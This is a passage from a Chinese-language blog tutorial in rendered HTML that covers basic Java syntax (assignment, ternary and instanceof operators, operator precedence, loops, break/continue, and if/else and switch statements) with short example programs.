class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">        c = a + b;</span><br><span class="line">        System.out.println(<span class="string">&quot;c = a + b = &quot;</span> + c );</span><br><span class="line">        c += a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c += a  = &quot;</span> + c );</span><br><span class="line">        c -= a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c -= a = &quot;</span> + c );</span><br><span class="line">        c *= a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c *= a = &quot;</span> + c );</span><br><span class="line">        a = <span class="number">10</span>;</span><br><span class="line">        c = <span class="number">15</span>;</span><br><span class="line">        c /= a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c /= a = &quot;</span> + c );</span><br><span class="line">        a = <span class="number">10</span>;</span><br><span class="line">        c = <span class="number">15</span>;</span><br><span class="line">        c %= a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c %= a  = &quot;</span> + c );</span><br><span class="line">        c &lt;&lt;= <span class="number">2</span> ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c &lt;&lt;= 2 = &quot;</span> + c );</span><br><span class="line">        c &gt;&gt;= <span class="number">2</span> ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c &gt;&gt;= 2 = &quot;</span> + c );</span><br><span class="line">        c &gt;&gt;= <span class="number">2</span> ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c &gt;&gt;= 2 = &quot;</span> + c );</span><br><span class="line">        c &amp;= a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c &amp;= a  = &quot;</span> + c );</span><br><span class="line">        c ^= a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c ^= a   = &quot;</span> + c );</span><br><span class="line">        c |= a ;</span><br><span class="line">        System.out.println(<span class="string">&quot;c |= a   = &quot;</span> + c );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509230354.png"></p><p>运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509230443.png"></p><h2 id="条件运算符（-）"><a href="#条件运算符（-）" class="headerlink" title="条件运算符（?:）"></a>条件运算符（?:）</h2><p>条件运算符也被称为<strong>三元运算符</strong>。该运算符有3个操作数，并且需要判断布尔表达式的值。该运算符的主要是决定哪个值应该赋值给变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable x = (expression) ? value <span class="keyword">if</span> <span class="keyword">true</span> : value <span class="keyword">if</span> <span class="keyword">false</span></span><br></pre></td></tr></table></figure><p><strong>实例:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> a , b;</span><br><span class="line">      a = <span class="number">10</span>;</span><br><span class="line">      <span class="comment">// 如果 a 等于 1 成立，则设置 b 为 20，否则为 30</span></span><br><span class="line">      b = (a == <span class="number">1</span>) ? <span class="number">20</span> : <span class="number">30</span>;</span><br><span class="line">      System.out.println( <span class="string">&quot;Value of b is : &quot;</span> +  b );</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 如果 a 等于 10 成立，则设置 b 为 20，否则为 30</span></span><br><span class="line">      b = (a == <span class="number">10</span>) ? <span class="number">20</span> : <span class="number">30</span>;</span><br><span class="line">      System.out.println( <span class="string">&quot;Value of b is : &quot;</span> + b );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509235057.png"></p><p>运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509235154.png"></p><h2 id="instanceof-运算符"><a href="#instanceof-运算符" class="headerlink" title="instanceof 运算符"></a>instanceof 运算符</h2><p>该运算符用于操作对象实例，检查该对象是否是一个特定类型（类类型或接口类型）。</p><p>instanceof运算符使用格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">( Object reference variable ) <span class="keyword">instanceof</span>  (<span class="class"><span class="keyword">class</span>/<span class="title">interface</span> <span class="title">type</span>)</span></span><br><span class="line"><span class="class">//（对象引用变量）实例（类/接口类型）</span></span><br></pre></td></tr></table></figure><p>如果运算符左侧变量所指的对象，是操作符右侧类或接口(class/interface)的一个对象，那么结果为真。</p><p>下面是一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String name = <span class="string">&quot;James&quot;</span>;</span><br><span class="line"><span class="keyword">boolean</span> result = name <span class="keyword">instanceof</span> String; <span class="comment">// 由于 name 是 String 类型，所以返回真</span></span><br></pre></td></tr></table></figure><p>如果被比较的对象兼容于右侧类型，该运算符仍然返回 true。</p><p>看下面的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vehicle</span> </span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Car</span> <span class="keyword">extends</span> <span class="title">Vehicle</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">      Vehicle a = <span class="keyword">new</span> Car();</span><br><span class="line">      <span class="keyword">boolean</span> result =  a <span class="keyword">instanceof</span> Car;</span><br><span class="line">      System.out.println( result);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果为       </span></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure><h2 id="Java运算符优先级"><a href="#Java运算符优先级" class="headerlink" title="Java运算符优先级"></a>Java运算符优先级</h2><p>下表中具有最高优先级的运算符在的表的最上面，最低优先级的在表的底部。</p><table><thead><tr><th align="left">类别</th><th align="left">操作符</th><th align="left">关联性</th></tr></thead><tbody><tr><td align="left">后缀</td><td align="left">() [] . (点操作符)</td><td align="left">左到右</td></tr><tr><td align="left">一元</td><td align="left">expr++ expr–</td><td align="left">从左到右</td></tr><tr><td align="left">一元</td><td align="left">++expr –expr + - ～ ！</td><td align="left">从右到左</td></tr><tr><td align="left">乘性</td><td align="left">* /％</td><td align="left">左到右</td></tr><tr><td align="left">加性</td><td align="left">+ -</td><td align="left">左到右</td></tr><tr><td align="left">移位</td><td align="left">&gt;&gt; &gt;&gt;&gt;  &lt;&lt;</td><td align="left">左到右</td></tr><tr><td align="left">关系</td><td align="left">&gt; &gt;= &lt; &lt;=</td><td align="left">左到右</td></tr><tr><td align="left">相等</td><td align="left">== !=</td><td align="left">左到右</td></tr><tr><td align="left">按位与</td><td align="left">＆</td><td align="left">左到右</td></tr><tr><td align="left">按位异或</td><td align="left">^</td><td align="left">左到右</td></tr><tr><td align="left">按位或</td><td align="left">|</td><td align="left">左到右</td></tr><tr><td align="left">逻辑与</td><td align="left">&amp;&amp;</td><td align="left">左到右</td></tr><tr><td align="left">逻辑或</td><td align="left">| |</td><td align="left">左到右</td></tr><tr><td align="left">条件</td><td align="left">？：</td><td align="left">从右到左</td></tr><tr><td align="left">赋值</td><td align="left">= + = - = * = / =％= &gt;&gt; = &lt;&lt; =＆= ^ = | =</td><td align="left">从右到左</td></tr><tr><td align="left">逗号</td><td align="left">，</td><td align="left">左到右</td></tr></tbody></table><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><p>Java中有三种主要的循环结构：</p><ul><li><strong>while</strong> 循环</li><li><strong>do…while</strong> 循环</li><li><strong>for</strong> 循环</li></ul><p>在 Java5 中引入了一种主要用于数组的增强型 for 循环。</p><h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h2><p>while是最基本的循环，对于 while 语句而言，<strong>如果不满足条件，则不能进入循环</strong>。它的结构为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>( 布尔表达式 ) &#123;</span><br><span class="line">  <span class="comment">//循环内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要布尔表达式为 true，循环就会一直执行下去。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        x = <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">while</span>(x &lt; <span class="number">20</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;x = &quot;</span>+ x);</span><br><span class="line">            x++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510002828.png"></p><p>该实例编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510002745.png"></p><h2 id="do…while-循环"><a href="#do…while-循环" class="headerlink" title="do…while 循环"></a>do…while 循环</h2><p><strong>即使不满足条件，也至少执行一次。</strong></p><p>do…while 循环和 while 循环相似，不同的是，do…while 循环至少会执行一次。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">       <span class="comment">//代码语句</span></span><br><span class="line">&#125;<span class="keyword">while</span>(布尔表达式);</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>布尔表达式在循环体的后面，所以语句块在检测布尔表达式之前已经执行了。 如果布尔表达式的值为 true，则语句块一直执行，直到布尔表达式的值为 false。</p><p><strong>PS：<code>while(条件)</code> 后一定要记得加<code>;</code></strong></p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        x = <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;x = &quot;</span> + x);</span><br><span class="line">            x++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(x&lt;<span class="number">20</span>);    <span class="comment">//while(条件)后记得加;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510004243.png"></p><p>以上实例编译运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510004130.png"></p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>for循环执行的次数是在执行前就确定的。语法格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化; 布尔表达式; 更新) &#123;</span><br><span class="line">    <span class="comment">//代码语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于 for 循环有以下几点说明：</p><ul><li>最先执行初始化步骤。可以声明一种类型，但可初始化一个或多个循环控制变量，也可以是空语句。</li><li>然后，检测布尔表达式的值。如果为 true，循环体被执行。如果为false，循环终止，开始执行循环体后面的语句。</li><li>执行一次循环后，更新循环控制变量。</li><li>再次检测布尔表达式。循环执行上面的过程。</li></ul><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">15</span>; x &lt; <span class="number">20</span>; x++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;x = &quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510010004.png"></p><p>实例编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510010036.png"></p><h2 id="Java-增强-for-循环"><a href="#Java-增强-for-循环" class="headerlink" title="Java 增强 for 循环"></a>Java 增强 for 循环</h2><p>Java5 引入了一种<strong>主要用于数组</strong>的增强型 for 循环。</p><p>Java 增强 for 循环语法格式如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(声明语句 : 表达式)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//代码句子</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>声明语句：</strong>声明新的局部变量，<strong>该变量的类型必须和数组元素的类型匹配</strong>。其作用域限定在循环语句块，其值与此时数组元素的值相等。</p><p><strong>表达式：</strong>表达式是要访问的数组名，或者是返回值为数组的方法。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [] num = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x : num)&#123;</span><br><span class="line">            System.out.print(x);</span><br><span class="line">            System.out.print(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line">        String [] names = &#123;<span class="string">&quot;edward&quot;</span>, <span class="string">&quot;sigma&quot;</span>, <span class="string">&quot;S1gma0&quot;</span>,<span class="string">&quot;si9ma0v0&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(String name : names)&#123;</span><br><span class="line">            System.out.print(name);</span><br><span class="line">            System.out.print(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510010933.png"></p><p>实例编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510011007.png"></p><h2 id="break-关键字"><a href="#break-关键字" class="headerlink" title="break 关键字"></a>break 关键字</h2><p>break 主要用在循环语句或者 switch 语句中，用来跳出整个语句块。</p><p>break 跳出最里层的循环，并且继续执行该循环下面的语句。</p><p><strong>语法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [] num = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x : num)&#123;</span><br><span class="line">            <span class="keyword">if</span>(x == <span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510011948.png"></p><p>实例编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510012030.png"></p><h2 id="continue-关键字"><a href="#continue-关键字" class="headerlink" title="continue 关键字"></a>continue 关键字</h2><p>continue 适用于任何循环控制结构中。作用是让程序立刻跳转到下一次循环的迭代。</p><p>在 for 循环中，continue 语句使程序立即跳转到更新语句。</p><p>在 while 或者 do…while 循环中，程序立即跳转到布尔表达式的判断语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> [] numbers = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> x : numbers ) &#123;</span><br><span class="line">         <span class="keyword">if</span>( x == <span class="number">30</span> ) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.print( x );</span><br><span class="line">         System.out.print(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510012406.png"></p><p>实例编译运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510012446.png"></p><h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>Java 中的条件语句允许程序根据条件的不同执行不同的代码块。</p><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>if语句语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式为true将执行的语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span>(x%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(x + <span class="string">&quot;可以被2整除&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510221759.png"></p><p>该实例编译运行的结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510221828.png"></p><h2 id="if…else"><a href="#if…else" class="headerlink" title="if…else"></a>if…else</h2><p>if…else的语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式)&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式的值为true</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式的值为false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="if…else-if…else-语句"><a href="#if…else-if…else-语句" class="headerlink" title="if…else if…else 语句"></a>if…else if…else 语句</h2><p>if 语句后面可以跟 else if…else 语句，这种语句可以检测到多种可能的情况。</p><p>使用 if，else if，else 语句的时候，需要注意下面几点：</p><ul><li>if 语句至多有 1 个 else 语句，else 语句在所有的 else if 语句之后。</li><li>if 语句可以有若干个 else if 语句，它们必须在 else 语句之前。</li><li><strong>一旦其中一个 else if 语句检测为 true，其他的 else if 以及 else 语句都将跳过执行</strong>。</li></ul><p>if…else if…else的语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式 <span class="number">1</span>)&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式 1的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式 <span class="number">2</span>)&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式 2的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式 <span class="number">3</span>)&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式 3的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="comment">//如果以上布尔表达式都不为true执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> x = <span class="number">30</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span>( x == <span class="number">10</span> )&#123;</span><br><span class="line">         System.out.print(<span class="string">&quot;Value of X is 10&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> <span class="keyword">if</span>( x == <span class="number">20</span> )&#123;</span><br><span class="line">         System.out.print(<span class="string">&quot;Value of X is 20&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> <span class="keyword">if</span>( x == <span class="number">30</span> )&#123;</span><br><span class="line">         System.out.print(<span class="string">&quot;Value of X is 30&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         System.out.print(<span class="string">&quot;这是 else 语句&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="嵌套的-if…else-语句"><a href="#嵌套的-if…else-语句" class="headerlink" title="嵌套的 if…else 语句"></a>嵌套的 if…else 语句</h2><p>使用嵌套的 if…else 语句是合法的。也就是说你可以在另一个 if 或者 else if 语句中使用 if 或者 else if 语句。</p><p>嵌套的 if…else 语法格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式 <span class="number">1</span>)&#123;</span><br><span class="line">   <span class="comment">////如果布尔表达式 1的值为true执行代码</span></span><br><span class="line">   <span class="keyword">if</span>(布尔表达式 <span class="number">2</span>)&#123;</span><br><span class="line">      <span class="comment">////如果布尔表达式 2的值为true执行代码</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> x = <span class="number">30</span>;</span><br><span class="line">      <span class="keyword">int</span> y = <span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span>( x == <span class="number">30</span> )&#123;</span><br><span class="line">         <span class="keyword">if</span>( y == <span class="number">10</span> )&#123;</span><br><span class="line">             System.out.print(<span class="string">&quot;X = 30 and Y = 10&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="switch-case"><a href="#switch-case" class="headerlink" title="switch case"></a>switch case</h2><p>switch case 语句判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。</p><p>switch case语句的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 